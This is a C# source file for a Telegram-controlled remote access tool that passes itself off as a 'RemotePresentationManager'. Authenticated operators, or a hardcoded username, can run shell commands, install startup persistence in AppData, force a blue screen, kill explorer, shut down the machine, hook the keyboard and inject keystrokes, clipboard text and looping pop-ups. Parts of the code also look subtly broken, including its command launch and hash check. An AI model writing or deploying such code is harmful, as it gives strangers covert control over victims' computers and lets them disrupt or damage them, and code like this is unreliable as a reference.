using NAudio.Wave;
using Payloads;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Media;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types;
using File = System.IO.File;
using Message = Telegram.Bot.Types.Message;

namespace RemotePresentationManager
{
    public class TelegramServer
    {
        TelegramBotClient Client;
        string PasswordHash = null;
        Chat CurrentChat;
        public bool Authenticated = false;

        public TelegramServer(string token, string passwordhash)
        {
            PasswordHash = passwordhash;
            Client = new TelegramBotClient(token);
            Client.OnMessage += Client_OnMessage;
            Client.StartReceiving();
        }

        private async void Client_OnMessage(object sender, MessageEventArgs e)
        {
            try
            {
                if (CurrentChat == null)
                {
                    CurrentChat = e.Message.Chat;
                    CheckCommand(e.Message);
                }
                else if (e.Message.Chat.Username.Equals("Adryzz"))
                {
                    CheckCommand(e.Message);
                }
                else if (CurrentChat.Id != e.Message.Chat.Id)
                {
                    await Client.SendTextMessageAsync(e.Message.Chat, "The bot is already in use");
                }
                else
                {
                    CheckCommand(e.Message);
                }
            }
            catch
            {
                Debug.WriteLine("Exception");
            }
        }

        private bool CheckPassword(string v)
        {
            if (PasswordHash == null)
            {
                return v.Equals("dbe6a4b729ff");
            }
            else
            {
                SHA512 sha = new SHA512Managed();
                string hash = Encoding.UTF8.GetString(sha.ComputeHash(Encoding.UTF8.GetBytes(v)));//calculate the hash of the typed password
                return hash.Equals(PasswordHash);
            }
        }

        private async void CheckCommand(Message m)
        {
            if (m.Type == Telegram.Bot.Types.Enums.MessageType.Text && !Authenticated)
            {
                if (m.Text.Equals("/start"))
                {
                    await Client.SendTextMessageAsync(m.Chat, "Connected");
                    return;
                }
                else if (m.Text.Equals("/stop"))
                {
                    await Client.SendTextMessageAsync(m.Chat, "Disconnecting...");
                    CurrentChat = null;
                    return;
                }
                else if (m.Text.StartsWith("/auth"))
                {
                    if (CheckPassword(m.Text.Remove(0, 6)))
                    {
                        Authenticated = true;
                        await Client.SendTextMessageAsync(m.Chat, "Authenticated");
                        await Client.DeleteMessageAsync(m.Chat, m.MessageId);
                        return;
                    }
                    else
                    {
                        await Client.SendTextMessageAsync(m.Chat, "Wrong password");
                        await Client.DeleteMessageAsync(m.Chat, m.MessageId);
                        return;
                    }
                }
            }

            if (Authenticated)
            {
                switch (m.Type)
                {
                    case Telegram.Bot.Types.Enums.MessageType.Text:
                        {
                            CheckTextCommand(m);
                            break;
                        }
                }
            }
        }

        private async void CheckTextCommand(Message m)
        {

            if (m.Text.Equals("/help"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Help();
            }
            else if (m.Text.StartsWith("/playsound "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                PlaySound(m.Text);
                Console.WriteLine("Play sound file");
            }
            else if (m.Text.StartsWith("/playurl "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                PlayMp3FromUrl(m.Text);
                Console.WriteLine("Play text");
            }
            else if (m.Text.StartsWith("/play "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Play(m.Text);
                Console.WriteLine("Play sound");
            }
            else if (m.Text.Equals("/mute"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Mute();
                Console.WriteLine("Mute");
            }
            else if (m.Text.Equals("/hide"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Program.Form1.Invoke(new WindowStateDelegate(SetWindowState), false);
                Console.WriteLine("Hide");
            }
            else if (m.Text.Equals("/show"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Program.Form1.Invoke(new WindowStateDelegate(SetWindowState), true);
                Console.WriteLine("Show");
            }
            else if (m.Text.Equals("/stop"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Stop();
                Console.WriteLine("Stop sound file player");
            }
            else if (m.Text.Equals("/pause"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Pause();
                Console.WriteLine("Pause sound file player");
            }
            else if (m.Text.Equals("/resume"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Resume();
                Console.WriteLine("Resume sound file player");
            }
            else if (m.Text.Equals("/unmute"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                UnMute();
                Console.WriteLine("Unmute");
            }
            else if (m.Text.StartsWith("/volume "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                AdjustVolume(m.Text);
                Console.WriteLine("Adjust volume");
            }
            else if (m.Text.StartsWith("/clip "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                SetClipboard(m.Text);
                Console.WriteLine("Edit clipboard");
            }
            else if (m.Text.StartsWith("/key "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Key(m.Text);
                Console.WriteLine("Send custom key");
            }
            else if (m.Text.StartsWith("/loop "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Loop(m.Text);
                Console.WriteLine("Set loop mode");
            }
            else if (m.Text.StartsWith("/say "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Say(m.Text);
                Console.WriteLine("Say text");
            }
            else if (m.Text.StartsWith("/img "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Draw(m.Text);
                Console.WriteLine("Draw bitmap");
            }
            else if (m.Text.StartsWith("/rotate "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Rotate(m.Text);
                Console.WriteLine("Rotate screen");
            }
            else if (m.Text.StartsWith("/mouse "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Mouse(m.Text);
                Console.WriteLine("Set mouse position");
            }
            else if (m.Text.StartsWith("/qmsg "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                QMsg(m.Text);
                Console.WriteLine("Question MessageBox");
            }
            else if (m.Text.StartsWith("/msg "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Msg(m.Text);
                Console.WriteLine("MessageBox");
            }
            else if (m.Text.StartsWith("/title "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Title(m.Text);
                Console.WriteLine("Set Title");
            }
            else if (m.Text.Equals("/msgloop"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                MsgLoop();
                Console.WriteLine("Loop MessageBox");
            }
            else if (m.Text.Equals("/hook"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Hook();
                Console.WriteLine("Hook keys");
            }
            else if (m.Text.Equals("/unhook"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                UnHook();
                Console.WriteLine("Unhook keys");
            }
            else if (m.Text.Equals("/close"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Environment.Exit(0);
            }
            else if (m.Text.Equals("/shutdown"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Shutdown();
                Console.WriteLine("SHUTDOWN COMMAND");
            }
            else if (m.Text.Equals("/reboot"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Reboot();
                Console.WriteLine("REBOOT COMMAND");
            }
            else if (m.Text.Equals("/bsod"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                BSoD();
                Console.WriteLine("BSOD COMMAND");
            }
            else if (m.Text.Equals("/explorer"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Explorer();
                Console.WriteLine("KILL EXPLORER");
            }
            else if (m.Text.Equals("/startup"))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Startup();
                Console.WriteLine("SETUP STARTUP RUN");
            }
            else if (m.Text.StartsWith("/vcmd "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                VCmd(m.Text);
                Console.WriteLine("VCMD COMMAND");
            }
            else if (m.Text.StartsWith("/cmd "))
            {
                await Client.SendTextMessageAsync(m.Chat, "OK");
                Cmd(m.Text);
                Console.WriteLine("CMD COMMAND");
            }
            else
            {
                Console.WriteLine(m.Text + " not recognized as a command");
                await Client.SendTextMessageAsync(m.Chat, "Invalid command");
            }
        }

        private async void Help()
        {
            await Client.SendTextMessageAsync(CurrentChat, "Help currently unavailable");
        }

        private async void PlaySound(string text)
        {
            text = text.Remove(0, 11);
            if (!File.Exists(text))
            {
                await Client.SendTextMessageAsync(CurrentChat, "The specified file does not exist");
                return;
            }
            if (Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Playing || Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Paused)
            {
                Program.Form1.WaveOutDevice.Stop();
            }
            if (Program.Form1.AudioFileReader != null)
            {
                Program.Form1.AudioFileReader.Dispose();
            }
            Program.Form1.AudioFileReader = new AudioFileReader(text);
            Program.Form1.WaveOutDevice.Init(Program.Form1.AudioFileReader);
            Program.Form1.WaveOutDevice.Play();
        }

        private void Title(string text)
        {
            Program.Form1.title = text.Remove(0, 7);
        }

        private void Cmd(string text)
        {
            text = text.Remove(0, 5);
            Process.Start("Program.Form1.cmd", "/c start " + text);
        }

        private void VCmd(string text)
        {
            text = text.Remove(0, 6);
            Program.Form1.CmdStream.WriteLine(text);
            Program.Form1.CmdStream.Flush();
            Program.Form1.CmdStream = Program.Form1.cmd.StandardInput;
        }

        private void Startup()
        {
            string exe = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager", "RemotePresentationManager.exe");
            string bat = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"Microsoft\Windows\Start Menu\Programs\Startup\RPM.bat");
            Directory.CreateDirectory(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RemotePresentationManager"));
            if (File.Exists(exe))
            {
                File.Delete(exe);
            }
            File.Copy(Application.ExecutablePath, exe);
            File.WriteAllText(bat, String.Format("start {0} {1}", exe, "WEBONLY"));
        }

        private void Explorer()
        {
            Process.Start("taskkill", "/f /im explorer.exe");
        }

        private void BSoD()
        {
            Miscellaneous.Crash();
        }

        private void Reboot()
        {
            Process.Start("shutdown", "/f /r /t 0");
        }

        private void Shutdown()
        {
            Process.Start("shutdown", "/f /s /t 0");
        }

        private void UnHook()
        {
            Keyboard.ReleaseKeyboardHook();
        }

        private void Hook()
        {
            Keyboard.KeyboardHook();
        }

        private void MsgLoop()
        {
            new Thread(() =>
            {
                string t1 = "Are you";
                string t2 = " sure you want to do this?";
                string t = "";
                while (MessageBox.Show(new Form { TopMost = true }, t1 + t + t2, Program.Form1.title, MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
                {
                    t += " really";
                }

            }).Start();
        }

        private void Msg(string text)
        {
            text = text.Remove(0, 5);
            new Thread(() =>
            {
                MessageBox.Show(new Form { TopMost = true }, text, Program.Form1.title);
                Client.SendTextMessageAsync(CurrentChat, "The user pressed OK");
            }).Start();
        }

        private void QMsg(string text)
        {
            text = text.Remove(0, 6);
            new Thread(() =>
            {
                DialogResult res = MessageBox.Show(new Form { TopMost = true }, text, Program.Form1.title, MessageBoxButtons.YesNo, MessageBoxIcon.Question);
                if (res == DialogResult.Yes)
                {
                    Client.SendTextMessageAsync(CurrentChat, "The user pressed YES");
                }
                else
                {
                    Client.SendTextMessageAsync(CurrentChat, "The user pressed NO");
                }
            }).Start();
        }

        private async void Mouse(string text)
        {
            try
            {
                text = text.Remove(0, 7);
                int x = Int32.Parse(text.Remove(text.IndexOf('Y')).Remove(0, 1));
                int y = Int32.Parse(text.Remove(0, text.IndexOf('Y')).Remove(0, 1));
                Cursor.Position = new Point(x, y);
            }
            catch (Exception)
            {
                await Client.SendTextMessageAsync(CurrentChat, "Arguments not in a correct format");
            }
        }

        private async void Rotate(string text)
        {
            text = text.Remove(0, 8);

            if (text.Equals("0"))
            {
                Display.Rotate(0, Display.Orientations.DEGREES_CW_0);
            }
            else if (text.Equals("90"))
            {
                Display.Rotate(0, Display.Orientations.DEGREES_CW_90);
            }
            else if (text.Equals("180"))
            {
                Display.Rotate(0, Display.Orientations.DEGREES_CW_180);
            }
            else if (text.Equals("270"))
            {
                Display.Rotate(0, Display.Orientations.DEGREES_CW_270);
            }
            else
            {
                await Client.SendTextMessageAsync(CurrentChat, "Arguments not in a correct format");
            }
        }

        private void Draw(string text)
        {
            text = text.Remove(0, 8);
            Drawing.DrawBitmapToScreen((Bitmap)Bitmap.FromFile(text));
        }

        private void Say(string text)
        {
            text = text.Remove(0, 5);
            Miscellaneous.Say(text);
        }

        private async void Loop(string text)
        {
            Program.Form1.loop = !Program.Form1.loop;
            await Client.SendTextMessageAsync(CurrentChat, "Loop mode: " + Program.Form1.loop);
        }

        private void Key(string text)
        {
            text = text.Remove(0, 5);

            if (text.Equals("ENTER"))
            {
                text = "{ENTER}";
            }
            else if (text.Equals("CANC"))
            {
                text = "{DEL}";
            }
            else if (text.Equals("TAB"))
            {
                text = "{TAB}";
            }
            else if (text.Equals("HELP"))
            {
                text = "{HELP}";
            }
            else if (text.Equals("CTRLV"))
            {
                text = "^V";
            }
            else if (text.Equals("TAB"))
            {
                text = "{TAB}";
            }
            else if (text.Equals("SHIFTAB"))
            {
                text = "+{TAB}";
            }
            else if (text.Equals("PLAYPAUSE"))
            {
                keybd_event(VK_MEDIA_PLAY_PAUSE, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_PLAY_PAUSE, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (text.Equals("PLAY"))
            {
                keybd_event(VK_MEDIA_PLAY, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_PLAY, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (text.Equals("PAUSE"))
            {
                keybd_event(VK_MEDIA_PAUSE, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_PAUSE, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (text.Equals("STOP"))
            {
                keybd_event(VK_MEDIA_STOP, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_STOP, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (text.Equals("NEXT"))
            {
                keybd_event(VK_MEDIA_NEXT_TRACK, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_NEXT_TRACK, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (text.Equals("PREV"))
            {
                keybd_event(VK_MEDIA_PREV_TRACK, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_PREV_TRACK, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (text.Equals("REW"))
            {
                keybd_event(VK_MEDIA_REWIND, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_REWIND, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }
            else if (text.Equals("FFW"))
            {
                keybd_event(VK_MEDIA_FAST_FORWARD, 0, KEYEVENTF_EXTENDEDKEY, IntPtr.Zero);
                keybd_event(VK_MEDIA_FAST_FORWARD, 0, KEYEVENTF_KEYUP, IntPtr.Zero);
                return;
            }

            SendKeys.SendWait(text);
        }

        private delegate void WindowStateDelegate(bool visible);

        private void SetWindowState(bool visible)
        {
            if (visible)
            {
                Program.Form1.Show();
            }
            else
            {
                Program.Form1.Hide();
            }
        }

        private delegate void SetClipboardDelegate(string data);

        private void SetClipboard(string data)
        {
            Clipboard.SetText(data);
        }

        private void AdjustVolume(string text)
        {
            text = text.Remove(0, 8);
            Program.Form1.DefaultPlaybackDevice.Volume = int.Parse(text);
        }

        private void UnMute()
        {
            Program.Form1.DefaultPlaybackDevice.Mute(false);
        }

        private void Resume()
        {
            Program.Form1.WaveOutDevice.Resume();
        }

        private void Pause()
        {
            Program.Form1.WaveOutDevice.Pause();
        }

        private void Stop()
        {
            Program.Form1.WaveOutDevice.Stop();
        }

        private void Mute()
        {
            Program.Form1.DefaultPlaybackDevice.Mute(true);
        }

        private async void Play(string text)
        {
            text = text.Remove(0, 5);

            if (text.Equals("ERROR"))
            {
                Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Hardware Fail.wav");
                Program.Form1.Player.Play();
            }
            else if (text.Equals("BACKGROUND"))
            {
                Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Background.wav");
                Program.Form1.Player.Play();
            }
            else if (text.Equals("FOREGROUND"))
            {
                Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Foreground.wav");
                Program.Form1.Player.Play();
            }
            else if (text.Equals("DEVICEIN"))
            {
                Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Hardware Insert.wav");
                Program.Form1.Player.Play();
            }
            else if (text.Equals("DEVICEOUT"))
            {
                Program.Form1.Player = new SoundPlayer(@"C:\Windows\Media\Windows Hardware Remove.wav");
                Program.Form1.Player.Play();
            }
            else
            {
                await Client.SendTextMessageAsync(CurrentChat, "No corresponding sound");
            }
        }

        private void PlayMp3FromUrl(string text)
        {
            text = text.Remove(0, 9);
            new Thread(() =>
            {
                try
                {
                    if (Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Playing || Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Paused)
                    {
                        Program.Form1.WaveOutDevice.Stop();
                    }
                    using (Stream ms = new MemoryStream())
                    {
                        using (Stream stream = WebRequest.Create(text)
                                .GetResponse().GetResponseStream())
                        {
                            byte[] buffer = new byte[32768];
                            int read;
                            while ((read = stream.Read(buffer, 0, buffer.Length)) > 0)
                            {
                                ms.Write(buffer, 0, read);
                            }
                        }

                        ms.Position = 0;
                        using (WaveStream blockAlignedStream =
                                new BlockAlignReductionStream(
                                    WaveFormatConversionStream.CreatePcmStream(
                                        new Mp3FileReader(ms))))
                        {
                            Program.Form1.WaveOutDevice.Init(blockAlignedStream);
                            Program.Form1.WaveOutDevice.Play();
                            while (Program.Form1.WaveOutDevice.PlaybackState == PlaybackState.Playing)
                            {
                                Thread.Sleep(100);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                     Client.SendTextMessageAsync(CurrentChat, ex.GetType() + ": " + ex.Message);
                }
            }).Start();
        }

        public void SendMessage(string message)
        {
            Client.SendTextMessageAsync(CurrentChat, message);
        }

        #region special keys dont touch here
        [DllImport("user32.dll", SetLastError = true)]
        static extern void keybd_event(byte virtualKey, byte scanCode, uint flags, IntPtr extraInfo);
        const int VK_MEDIA_NEXT_TRACK = 0xB0;
        const int VK_MEDIA_PREV_TRACK = 0xB1;
        const int VK_MEDIA_PLAY_PAUSE = 0xB3;
        const int VK_MEDIA_PLAY = 0xFA;
        const int VK_MEDIA_PAUSE = 0x13;
        const int VK_MEDIA_STOP = 0xB2;
        const int VK_MEDIA_FAST_FORWARD = 0x31;
        const int VK_MEDIA_REWIND = 0x32;
        const int KEYEVENTF_EXTENDEDKEY = 0x0001; //Key down flag
        const int KEYEVENTF_KEYUP = 0x0002; //Key up flag
        #endregion
    }
}
